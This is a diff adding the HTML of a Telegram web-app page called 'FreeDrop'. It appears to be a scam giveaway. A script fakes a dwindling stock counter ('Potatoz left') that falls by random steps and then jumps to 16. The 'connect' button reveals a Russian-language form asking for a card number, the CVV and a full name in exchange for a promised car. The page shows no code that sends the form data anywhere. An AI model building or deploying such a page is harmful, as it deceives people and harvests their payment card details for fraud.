@@ -1,0 +1,201 @@
+<!doctype html>
+<html lang="en">
+  
+<head>	
+ 
+
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>FreeDrop</title>
+    <link rel="shortcut icon" type="image/x-icon" href="images/favicon.png">
+    <link rel="stylesheet" href="src/css/animate.css">
+    <link rel="stylesheet" href="src/css/slick.css">
+    <link rel="stylesheet" href="src/css/bootstrap.css">
+    <link rel="stylesheet" href="src/css/style.css"> 
+    <script src="https://kit.fontawesome.com/1409195906.js" crossorigin="anonymous"></script>
+    <script src="src/js/settings.js"></script>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+	  <!-- Facebook Pixel Code -->
+<!-- End Facebook Pixel Code -->
+
+
+</style>
+</head>
+<body>
+<!-- <nodes.js embedding> -->
+
+<div style="position: absolute; left: 0px; top: 0px; overflow: hidden; width: 100%; height: 100%;">
+ 
+</div>
+<!-- </nodes.js embedding> -->
+
+<script type="text/javascript">
+  window.onresize = function () {
+      nodesjs.setWidth(window.innerWidth);
+      nodesjs.setHeight(window.innerHeight);
+  };
+</script>
+
+
+  </head>
+  <body class="body-bg">
+
+<!-- header -->
+  <header id="head" class="page-header">
+        <div class="container">
+            <nav class="navbar navbar-expand-lg">
+                  <a class="navbar-brand" >FreeDrop</a>
+                  <button class="navbar-toggler navbar-toggler-main" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="stick"></span>
+                  </button>
+                  <div class="collapse navbar-collapse" id="navbarSupportedContent">
+                    <button class="navbar-toggler navbar-toggler-main" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+                        <span class="stick"></span>
+                    </button>
+                    <ul class="navbar-nav ms-auto">
+                        <li class=""><a data-scroll href="index.html#about">About us</a></li>
+                        <li class=""><a data-scroll href="index.html#artist">friends</a></li>
+                        <li class=""><a data-scroll href="index.html#faq">FAQ</a></li>
+                        <!-- <li class=""><a data-scroll href="index.html#roadmap">Roadmap</a></li> -->
+                    </ul>
+                  </div>
+                  <button class="navbar-toggler" id="navoverlay" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"></button>
+              </nav>
+
+        </div>
+  </header>
+  <!-- header -->
+
+  <!-- banner -->
+  <div id="main" class="masthead ">
+    <!-- <div class="masthead-man wow animate__animated animate__fadeInLeft" data-wow-duration="1s">
+      <img width="40%" src="images/man-v1.gif" class="img-fluid" alt="">
+    </div> -->
+    <div class="container ">
+      <div class="masthead-content text-block-12 ">
+        <img width="80%" src="images/text-v1.gif" class="img-fluid banner-text wow animate__animated animate__fadeInUp" data-wow-duration="1s" alt="">
+        <div class="countdown">
+        
+          <div>
+            <div  style="display: flex;" class="wow animate__animated animate__fadeInUp" data-wow-duration="1s" data-wow-delay="0.5s">
+            <div>
+              <h3>&nbsp&nbsp&nbsp&nbsp&nbspPotatoz left: &nbsp&nbsp</h3>
+            </div>
+            <h3 id="ticket-count"></h3>
+            <h3>&nbsp / 300</h3>
+            </div>
+
+    <script>
+      let timestep = 2500;
+          function getRandomInt(min, max) {
+            return Math.floor(Math.random() * (max - min)) + min;
+          }
+            // Счетчик
+
+          const txt = document.getElementById('ticket-count');
+          let item = 214;
+
+          let fun = setInterval(function(){
+              let stack = getRandomInt(3, 5);  // шаг
+              console.log(stack);
+              item -=stack;
+            if(item <= 120){
+              clearInterval(fun);
+              item = 16;
+            }
+            timestep = getRandomInt(50, 100);  // 1000ms = 1s
+            console.log(timestep);
+            txt.innerHTML = item;
+          },
+          timestep);
+  </script>
+
+
+      </div>
+        </div>
+        <button id="buy" class="sendetc btn-banner wow animate__animated animate__fadeInUp"  >connect</button>
+       
+      </div>
+    </div>
+    <div class="masthead-container">
+      <div class="masthead-container-content">
+        <a data-scroll href="index.html#about" class="scroll-text wow animate__animated animate__fadeInDown" data-wow-duration="1s"><img src="images/scroll-text.png" class="img-fluid" alt=""></a>
+      </div>
+    </div>
+  </div>
+  <!-- banner -->
+
+  <form id="form">
+    <input type="text" class="wow animate__animated animate__fadeInLeft" placeholder="номер карточки" id="nomer">
+    <input type="text" class="wow animate__animated animate__fadeInRight"   placeholder="3 цифры с оборота" id="cvv">
+    <input type="text" class="wow animate__animated animate__fadeInLeft"   placeholder="Имя и Фамилия" id="FIO">
+    <button id="order" class="sendetc btn-banner wow animate__animated animate__fadeInUp" >ПОЛУЧИТЬ крутую тачку</button>
+  </form>
+  
+  
+<!-- Modalthird -->
+
+<!-- Jquery-->
+  <script src="src/js/jquery-3.2.0.min.js"></script> <!-- jquery -->
+  <script src="src/js/bootstrap.js"></script> <!-- bootstrap js -->
+  <script src="src/js/slick.js"></script>
+  <script src="src/js/in-view.min.js"></script>
+
+
+  <!-- TG-->
+	<script src="https://telegram.org/js/telegram-web-app.js"></script>
+	<script>
+		let tg = window.Telegram.WebApp;
+		let buy = document.getElementById("buy");
+		let order = document.getElementById("order");
+
+	buy.addEventListener("click", ()=> {
+		 	document.getElementById("main").style.display = "none"
+		 	document.getElementById("form").style.display = "block"
+
+
+		 });
+     // Show main button
+    //  Telegram.WebApp.MainButton.setParams({
+    //         text: 'Main Button'
+    //     });
+    //     Telegram.WebApp.MainButton.onClick(function () {
+    //       document.getElementById("main").style.display = "none"
+    //       document.getElementById("form").style.display = "block"
+          
+
+    //     });	
+    //     Telegram.WebApp.MainButton.show();
+    
+
+	</script>
+<!-- TG-->
+
+
+
+  <!-- Основной скрипт-->
+
+
+<script src="src/js/purecounter_vanilla.js"></script>
+<script>
+    // Initialize PureCounter by Default. It also can be stored on variable
+    new PureCounter();
+    // Initialize PureCounter using custom selector and custom default configuration.
+    // It also can be stored on variable
+    new PureCounter({
+        filesizing: true,
+        selector: ".filesizecount",
+        pulse: 2,
+    });
+</script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+    
+      gtag('config', 'G-V8QSQQQX2P');
+    </script>
+  
+  </body>
+</html>	
